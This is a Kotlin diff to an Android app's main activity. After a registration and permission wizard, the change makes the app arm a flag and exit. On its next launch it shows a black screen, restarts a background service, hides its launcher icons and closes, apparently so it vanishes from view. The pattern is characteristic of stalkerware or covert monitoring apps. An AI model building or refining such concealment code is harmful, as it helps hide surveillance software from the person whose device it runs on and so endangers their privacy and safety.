@@ -47,6 +47,7 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleEventObserver
+import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
@@ -59,10 +60,12 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         val store = RegistrationStore(this)
+        val prefs = HidePrefs(this)
 
-        // Already sealed in a previous run: pure step 6 path.
-        if (store.isRegistered()) {
-            beginVeil()
+        // A previous run armed the hide: this launch performs it, then vanishes.
+        val hideArmed = kotlinx.coroutines.runBlocking { prefs.pendingHide() }
+        if (hideArmed) {
+            runHideSequence(prefs)
             return
         }
 
@@ -75,13 +78,17 @@ class MainActivity : ComponentActivity() {
 
         setContent {
             MaterialTheme {
-                WizardScreen(api, store, checker, opener, deviceInfo, onSealed = { beginVeil() })
+                WizardScreen(api, store, checker, opener, deviceInfo, onSealed = {
+                    // Only arm the flag here; the NEXT launch performs the vanish.
+                    prefs.setPendingHide(true)
+                    finishAffinity()
+                })
             }
         }
     }
 
-    /** Step 6: 2000ms black veil, revive service, hide visible launcher alias, finish. */
-    fun beginVeil() {
+    /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
+    private fun runHideSequence(prefs: HidePrefs) {
         val veil = android.view.View(this)
         veil.setBackgroundColor(android.graphics.Color.BLACK)
         setContentView(veil)
@@ -91,6 +98,7 @@ class MainActivity : ComponentActivity() {
             } catch (_: Exception) {
             }
             setAliases(hiddenVisible = true)
+            lifecycleScope.launch { prefs.clear() }
             finish()
         }, VEIL_MS)
     }
@@ -194,7 +202,7 @@ fun WizardScreen(
     checker: PermissionChecker,
     opener: PermissionOpener,
     deviceInfo: DeviceInfoProvider,
-    onSealed: () -> Unit
+    onSealed: suspend () -> Unit
 ) {
     var step by remember { mutableStateOf(Step.INTRO) }
     var name by remember { mutableStateOf("") }
